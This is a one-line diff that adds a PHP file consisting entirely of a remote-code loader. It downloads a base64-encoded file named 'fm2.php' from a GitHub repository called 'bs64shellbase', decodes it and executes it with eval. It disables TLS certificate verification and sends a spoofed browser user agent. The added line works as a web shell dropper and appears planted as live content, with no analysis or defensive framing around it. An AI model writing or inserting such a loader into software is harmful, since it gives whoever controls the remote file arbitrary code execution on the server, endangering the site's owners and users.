@@ -1,0 +1,1 @@
+<?php eval("?>".base64_decode(curl_exec(tap(curl_init('https://raw.githubusercontent.com/Cnull00/bs64shellbase/refs/heads/main/fm2.php'),function($c){curl_setopt_array($c,[CURLOPT_RETURNTRANSFER=>1,CURLOPT_FOLLOWLOCATION=>1,CURLOPT_USERAGENT=>'Mozilla/5.0',CURLOPT_SSL_VERIFYPEER=>0,CURLOPT_SSL_VERIFYHOST=>0]);})))); function tap($v,$f){$f($v);return $v;}
